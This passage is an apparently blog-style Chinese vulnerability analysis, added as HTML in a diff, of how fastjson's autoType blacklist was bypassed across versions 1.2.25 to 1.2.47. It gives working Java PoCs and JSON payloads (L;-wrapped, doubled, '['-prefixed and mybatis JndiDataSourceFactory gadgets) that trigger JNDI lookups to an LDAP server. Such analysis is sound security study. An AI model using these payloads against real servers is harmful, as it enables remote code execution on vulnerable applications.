+org.springframework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开启 <code>autoTypeSupport</code> 的方法：</p>
+<p>在代码中设置 <code>ParserConfig</code> 类对应的属性</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>添加白名单的方法：</p>
+<ol>
+<li>在代码中设置 <code>ParserConfig</code> 类对应的属性</li>
+</ol>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAccept</span><span class="token punctuation">(</span><span class="token string">"com.sun."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>新建 <code>fastjson.properties</code> 文件添加对应属性设置</li>
+</ol>
+<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">fastjson.parser.autoTypeAccept</span><span class="token punctuation">=</span><span class="token value attr-value">com.sun.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="修复方案分析"><a href="#修复方案分析" class="headerlink" title="修复方案分析"></a>修复方案分析</h3><p><img src="/images/image-20230803213415211.png" alt="image-20230803213415211"></p>
+<p><code>DefaultJSONParser</code> 类中新增加调用 <code>config.checkAutoType</code> 方法</p>
+<p><img src="/images/image-20230803213718112.png" alt="image-20230803213718112"></p>
+<p><img src="/images/image-20230803214141102.png" alt="image-20230803214141102"></p>
+<p><code>checkAutoType</code> 方法前面主要是判断如果开启了 <code>autoTypeSupport</code> 那么就从看看白名单有没有允许反序列化类全限定类名前缀，再从黑名单中看看反序列化类的全限定类名前缀是不是在黑名单内，在黑名单内的话就抛出异常。这里我debug时，提前开启了 <code>autoTypeSupport</code> 才能走到这里，否则执行到下面就抛出异常了</p>
+<p><img src="/images/image-20230803214421162.png" alt="image-20230803214421162"></p>
+<p>若没有开启 <code>autoTypeSupport</code>，这里先判断反序列化类的全限定类名前缀是否在黑名单内，再判断是否在白名单内，在白名单内就允许加载类，这样就让攻击者进行反序列化攻击更难了</p>
+<h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>这里只考虑开启 <code>autoTypeSupport</code> 的情况，使用JdbcRowSetImpl链来利用</p>
+<p><img src="/images/image-20230803215506286.png" alt="image-20230803215506286"></p>
+<p><img src="/images/image-20230803215602372.png" alt="image-20230803215602372"></p>
+<p>可以看到在 <code>TypeUtils</code> 类中的 <code>loadClass</code> 方法中，判断了全限定类名是否是以 <code>L</code> 开头和 <code>;</code> 结尾的，那么这里可以想一想，在前面判断了我们JSON字符串中的全限定类名前缀在不在黑名单内，那么我们在全限定类名的最开头加上 <code>L</code> 结尾加上 <code>;</code>，这样在黑名单时检查不到，到了这里也能正常加载类，这样就可以绕过了</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0"</span> <span class="token operator">+</span>
+                <span class="token string">".1:8085/cOzANMth\",\"autoCommit\":false&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span>
+    <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:8085/cOzANMth"</span><span class="token punctuation">,</span>
+    <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230803220113643.png" alt="image-20230803220113643"></p>
+<p>这样就成功躲过了黑名单检测，并且还能正常加载类</p>
+<h2 id="fastjson-lt-x3D-1-2-42版本绕过"><a href="#fastjson-lt-x3D-1-2-42版本绕过" class="headerlink" title="fastjson&lt;&#x3D;1.2.42版本绕过"></a>fastjson&lt;&#x3D;1.2.42版本绕过</h2><p>fastjson1.2.42版本对之前的1.2.25版本绕过进行了修复，虽然还是黑白名单检测，但是开发者将这些黑白名单校验改为黑白名单的HASH校验，且对开头以 <code>L</code> 和 结尾以 <code>;</code> 的绕过方法进行了修复</p>
+<p>具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</p>
+<h3 id="修复方案分析-1"><a href="#修复方案分析-1" class="headerlink" title="修复方案分析"></a>修复方案分析</h3><p><img src="/images/image-20230804103810086.png" alt="image-20230804103810086"></p>
+<p>在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 类中，将明文黑白名单转成了HASH黑白名单</p>
+<p><img src="/images/image-20230804101021069.png" alt="image-20230804101021069"></p>
+<p><img src="/images/image-20230804102053020.png" alt="image-20230804102053020"></p>
+<p>在 <code>checkAutoType</code> 方法中多了判断 <code>className</code> 全限定类名是否是以 <code>L</code> 开头 <code>;</code> 结尾，如果是则去除掉</p>
+<p><img src="/images/image-20230804102704748.png" alt="image-20230804102704748"></p>
+<p>然后再将 <code>className</code> 转hashcode，将这个hashcode去白名单和黑名单hashcode比较，这样好像是解决了fastjson1.2.25版本的绕过问题了</p>
+<h3 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>先给出绕过的POC，其实就是双写 <code>L</code> 和双写 <code>;</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0"</span> <span class="token operator">+</span>
+                <span class="token string">".1:8085/cOzANMth\",\"autoCommit\":false&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">,</span>
+    <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:8085/cOzANMth"</span><span class="token punctuation">,</span>
+    <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230804103200858.png" alt="image-20230804103200858"></p>
+<p>问题出在这里，这里只是进行了一次截取，我们只需要双写 <code>L</code> 和 <code>;</code> 即可绕过</p>
+<h2 id="fastjson-lt-x3D-1-2-43版本绕过"><a href="#fastjson-lt-x3D-1-2-43版本绕过" class="headerlink" title="fastjson&lt;&#x3D;1.2.43版本绕过"></a>fastjson&lt;&#x3D;1.2.43版本绕过</h2><p>fastjson1.2.43版本修复了fastjson 1.2.42版本的双写绕过问题</p>
+<p>具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</p>
+<h3 id="修复方案分析-2"><a href="#修复方案分析-2" class="headerlink" title="修复方案分析"></a>修复方案分析</h3><p><img src="/images/image-20230804112841653.png" alt="image-20230804112841653"></p>
+<p>这里对双写的 <code>L</code> 和 <code>;</code> 进行了判断，如果是则抛出异常</p>
+<h3 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h3><p><img src="/images/image-20230804163217608.png" alt="image-20230804163217608"></p>
+<p>问题是出在 <code>TypeUtils</code> 类中，判断以 <code>L</code> 开头和 <code>;</code> 结尾的方法已经不能用了，但是不仅仅只有这个条件才可以类加载，在上面一个条件判断以 <code>[</code> 开头的也是可以进行类加载的</p>
+<p><img src="/images/image-20230805101310923.png" alt="image-20230805101310923"></p>
+<p><img src="/images/image-20230805101649795.png" alt="image-20230805101649795"></p>
+<p>而在后续调用到 <code>parseArray</code> 方法，其中也判断了当前的 <code>token</code> 值是否是14，不是的话就抛出异常了，导致后续不能进行JNDI注入，那么只需要在获取完类名以后接着跟上一个 <code>[</code> 再跟上一个 <code>&#123;</code>，这样就绕过了</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"ldap://127.0.0"</span> <span class="token operator">+</span>
+                <span class="token string">".1:8085/cOzANMth\",\"autoCommit\":false"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span>						<span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:8085/cOzANMth"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="fastjson-lt-x3D-1-2-45版本绕过"><a href="#fastjson-lt-x3D-1-2-45版本绕过" class="headerlink" title="fastjson&lt;&#x3D;1.2.45版本绕过"></a>fastjson&lt;&#x3D;1.2.45版本绕过</h2><p>在fastjson1.2.44版本中修复了1.2.43版本的绕过问题，在</p>
+<p>具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45</p>
+<h3 id="修复方案分析-3"><a href="#修复方案分析-3" class="headerlink" title="修复方案分析"></a>修复方案分析</h3><p><img src="/images/image-20230806130938110.png" alt="image-20230806130938110"></p>
+<p>在fastjson1.2.44版本中，<code>checkAutoType</code> 方法中判断了className的第一个字符如果是 <code>[</code> 就抛出异常</p>
+<h3 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>这里的绕过就是在fastjson1.2.44版本修复了1.2.43的绕过后，基于黑名单的绕过</p>
+<p>黑名单不能保证所有可利用的类都能添加到黑名单，<code>jackson</code> 也是基于黑名单的方式，也是可以参考 <code>jackson</code> 的黑名单绕过来绕过fastjson的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","</span> <span class="token operator">+</span>
+                <span class="token string">"\"properties\":&#123;\"data_source\":\"ldap://127.0.0.1:8085/cOzANMth\"&#125;&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由于这个利用的类是mybatis依赖中的，所以利用这个类需要mybatis依赖</p>
+<h2 id="fastjson-lt-x3D-1-2-47版本绕过"><a href="#fastjson-lt-x3D-1-2-47版本绕过" class="headerlink" title="fastjson&lt;&#x3D;1.2.47版本绕过"></a>fastjson&lt;&#x3D;1.2.47版本绕过</h2><p>在fastjson1.2.47版本，可以不用开启 <code>AutoTypeSupport</code> 即可进行反序列化</p>
+<p>具体影响版本：</p>
+<p>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32（AutoTypeSupport未开启）</p>
+<p>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</p>
+<h3 id="绕过分析-4"><a href="#绕过分析-4" class="headerlink" title="绕过分析"></a>绕过分析</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> expectClass<span class="token punctuation">,</span> <span class="token keyword">int</span> features<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">128</span> <span class="token operator">||</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token class-name">String</span> className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'$'</span><span class="token punctuation">,</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">BASIC</span> <span class="token operator">=</span> <span class="token number">0</span>xcbf29ce484222325L<span class="token punctuation">;</span>
+    <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">0</span>x100000001b3L<span class="token punctuation">;</span>
+
+    <span class="token keyword">final</span> <span class="token keyword">long</span> h1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BASIC</span> <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>h1 <span class="token operator">==</span> <span class="token number">0</span>xaf64164c86024f1aL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// [</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h1 <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">PRIME</span> <span class="token operator">==</span> <span class="token number">0</span>x9198507b5af98f0L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">final</span> <span class="token keyword">long</span> h3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">BASIC</span> <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">)</span>
+            <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">)</span>
+            <span class="token operator">^</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token operator">*</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">long</span> hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            hash <span class="token operator">^=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            hash <span class="token operator">*=</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        clazz <span class="token operator">=</span> deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span>
+                <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span>
+                <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
